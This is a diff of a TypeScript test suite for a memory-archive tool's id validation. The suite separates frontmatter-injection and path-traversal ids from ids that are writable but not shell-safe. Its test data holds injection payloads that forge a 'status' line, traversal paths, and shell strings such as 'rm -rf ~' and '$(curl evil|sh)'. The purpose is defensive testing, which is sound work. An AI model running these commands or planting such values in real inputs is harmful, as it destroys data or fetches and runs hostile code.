@@ -993,35 +993,63 @@ describe("missingRewriteField — round-27: `status` must be one of the FOUR Mem
   });
 });
 
-describe("missingRewriteField — round-32 (SECURITY): the FULL id must be safe, not just its SLUG", () => {
-  // Round-32: the gate validated only the id's FINAL SEGMENT
+describe("missingRewriteField — round-33: the id check is scoped to WRITE safety, not shell safety", () => {
+  // Round-32 fixed a real hole: the gate validated only the id's FINAL SEGMENT
   // (`isSafePathSegment(id.split("/").pop())`), so a KEY-CONSISTENT row whose id
   // carried a NEWLINE in an EARLIER segment — `semantic/p\nforged: value/safe` —
   // passed, got PLANNED by the unattended `memory-archive --apply` digest
   // consolidation, and reached the rewriter. `renderMemoryMarkdown` writes
   // `id: ${entry.id}` into YAML FRONTMATTER, which is LINE-ORIENTED: the newline
   // emits an EXTRA `forged: value` line that `parse` reads back as a REAL FIELD.
-  // Forging `status: active` there silently UN-ARCHIVES an entry. The gate now
-  // reuses `isSafeMemoryId` — the SAME predicate the render/hint side uses — so
-  // the two notions of a safe id cannot drift.
+  // Forging `status: active` there silently UN-ARCHIVES an entry.
+  //
+  // …but it fixed it with the WRONG predicate. It reused `isSafeMemoryId`, which
+  // exists to guard rendering a copy-pasteable SHELL COMMAND (round-28) and so
+  // rejects ALL WHITESPACE. The rewrite gate only has to stop FRONTMATTER
+  // INJECTION (ASCII control characters) and PATH ABUSE. A SPACE does neither —
+  // and spaces are REAL: `projectSlugFromPath` doesn't sanitize, so a checkout at
+  // `~/code/my project` yields the slug `code-my project` and ids like
+  // `semantic/code-my project/some-slug`. The over-strict gate made EVERY memory
+  // in such a project a "malformed index row". Round-33 gives the write side its
+  // own `isWritableMemoryId`; the two predicates are deliberately different.
   const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
     id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
   });
 
   /** Ids that pass the OLD slug-only check (their final segment is innocuous)
-   *  but are unsafe as a whole. The first is the frontmatter-injection payload. */
-  const POISON_IDS = [
+   *  but can FORGE A FRONTMATTER LINE. The first is the round-32 payload. */
+  const INJECTION_IDS = [
     "semantic/p\nforged: value/safe",   // newline in a NON-final segment → forges a frontmatter line
     "semantic/p/safe\nstatus: active",  // newline in the FINAL segment → forges `status`
-    "semantic/p q/safe",                // whitespace
-    "semantic/p;rm -rf ~/safe",         // shell metacharacters
-    "semantic/$(curl evil|sh)/safe",    // command substitution
     "semantic/p\rforged: value/safe",   // carriage return
+    "semantic/p\tq/safe",               // TAB — still a control character
+    "semantic/p\u0000q/safe",           // NUL
+    "semantic/p\u007Fq/safe",           // DEL
   ];
 
-  it("rejects every unsafe FULL id as `unsafe id` (never as missing)", async () => {
+  /** Ids that are NOT shell-safe (so no restore command may ever be rendered for
+   *  them — see the cold-pass tests) but ARE safe to WRITE: no control character,
+   *  no traversal, and the canonical path still lands under `memory/`. These MUST
+   *  pass the rewrite gate — the first two are what a real checkout under a
+   *  directory whose name contains a SPACE actually produces. */
+  const WRITABLE_IDS: Array<[string, Partial<MemoryEntry>]> = [
+    ["semantic/code-my project/some-slug", { project: "code-my project" }], // ~/code/my project
+    ["semantic/p/slug with space", {}],                                     // space in the SLUG
+    ["semantic/p q/safe", {}],                                              // space in a middle segment
+    ["semantic/p;rm -rf ~/safe", {}],                                       // shell metacharacters
+    ["semantic/$(curl evil|sh)/safe", {}],                                  // command substitution
+  ];
+
+  /** Ids that would traverse or produce an unusable path. */
+  const PATH_ABUSE_IDS = [
+    "semantic/p/..", "semantic/../core/x", "semantic/p/.",
+    "semantic//safe", "/semantic/p/safe", "semantic/p/safe/",
+    "a/" + "x".repeat(400), // absurdly long → an unwritable filename
+  ];
+
+  it("rejects every FRONTMATTER-FORGING id as `unsafe id` (never as missing)", async () => {
     const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
-    for (const id of POISON_IDS) {
+    for (const id of INJECTION_IDS) {
       const row = complete({ id });
       expect([id, missingRewriteField(row)]).toEqual([id, "unsafe id"]);
       expect(describeRewriteDefect(missingRewriteField(row)!)).toBe("unsafe id");
@@ -1030,19 +1058,63 @@ describe("missingRewriteField — round-32 (SECURITY): the FULL id must be safe,
     }
   });
 
-  it("the gate is load-bearing: those ids really would forge frontmatter in the renderer", async () => {
-    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
-    // Post-hardening the renderer refuses outright; pre-hardening it emitted the
-    // forged line. Either way the row must never get this far — the gate is what
-    // keeps the unattended archive run from reaching it.
-    expect(() => renderMemoryMarkdown(complete({ id: POISON_IDS[0] }), "body")).toThrow();
+  it("rejects traversing / empty-segment / absurdly long ids", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const id of PATH_ABUSE_IDS) {
+      const row = complete({ id });
+      expect([id, missingRewriteField(row)]).toEqual([id, "unsafe id"]);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
   });
 
-  it("the gate agrees with isSafeMemoryId, the render/hint-side predicate (no drift)", async () => {
+  it("ACCEPTS an id with a SPACE or ordinary punctuation — they cannot forge a line", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const [id, over] of WRITABLE_IDS) {
+      const row = complete({ id, ...over });
+      expect([id, missingRewriteField(row)]).toEqual([id, null]);
+      expect(isRewritableEntry(row)).toBe(true);
+    }
+  });
+
+  it("the gate is load-bearing: the forging ids really would break the renderer", async () => {
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const id of INJECTION_IDS) {
+      expect(() => renderMemoryMarkdown(complete({ id }), "body")).toThrow(/control character/);
+    }
+  });
+
+  it("a writable-but-not-shell-safe id renders ONE clean `id:` line (no forged key)", async () => {
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const [id, over] of WRITABLE_IDS) {
+      const md = renderMemoryMarkdown(complete({ id, ...over }), "body");
+      expect([id, md.match(/^id: .*$/gm)]).toEqual([id, [`id: ${id}`]]);
+    }
+  });
+
+  it("the write gate and the SHELL-safety predicate are DELIBERATELY different", async () => {
     const { missingRewriteField } = await import("../../src/memory/apply.js");
-    const { isSafeMemoryId } = await import("../../src/memory/gate.js");
-    for (const id of [...POISON_IDS, "semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"]) {
-      expect([id, missingRewriteField(complete({ id })) === "unsafe id"]).toEqual([id, !isSafeMemoryId(id)]);
+    const { isSafeMemoryId, isWritableMemoryId } = await import("../../src/memory/gate.js");
+    // The gate follows the WRITE predicate exactly…
+    for (const [id, over] of WRITABLE_IDS) {
+      expect([id, missingRewriteField(complete({ id, ...over })) === "unsafe id"]).toEqual([id, !isWritableMemoryId(id)]);
+    }
+    for (const id of [...INJECTION_IDS, ...PATH_ABUSE_IDS]) {
+      expect([id, missingRewriteField(complete({ id })) === "unsafe id"]).toEqual([id, !isWritableMemoryId(id)]);
+    }
+    // …and the two predicates genuinely disagree, which is the point: every
+    // WRITABLE_IDS entry is writable yet NOT shell-safe. If someone "unifies"
+    // them again this fails.
+    for (const [id] of WRITABLE_IDS) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, true, false]);
+    }
+    // Neither predicate is a superset in the other direction: a control character
+    // and a traversal are rejected by BOTH.
+    for (const id of [...INJECTION_IDS, ...PATH_ABUSE_IDS]) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, false, false]);
+    }
+    // Canonical ids pass both.
+    for (const id of ["semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"]) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, true, true]);
     }
   });
 
